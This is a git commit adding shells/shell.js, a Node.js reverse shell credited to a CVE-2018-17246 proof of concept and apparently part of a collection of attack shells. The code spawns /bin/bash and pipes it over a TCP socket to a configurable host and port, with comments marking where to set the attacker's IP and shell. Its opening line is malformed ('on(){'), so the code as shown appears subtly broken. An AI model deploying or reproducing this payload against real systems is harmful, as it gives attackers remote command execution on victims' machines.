d7f8d9017d28547cdc1b7bcf226645ff62ac49c0
ChristianSch <ChristianSch@users.noreply.github.com>
2019-07-23 11:17:04 +0200

    added node.js shell

---
+++ shells/shell.js
@@ -0,0 +1,15 @@
+// creds: https://github.com/mpgn/CVE-2018-17246/blob/3d866d5321b63185592d1abd01b5cdea550f6c76/README.md
+on(){
+    var net = require("net"),
+        cp = require("child_process"),
+        // config shell here
+        sh = cp.spawn("/bin/bash", []);
+    var client = new net.Socket();
+    // config ip/port here
+    client.connect(4556, "127.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
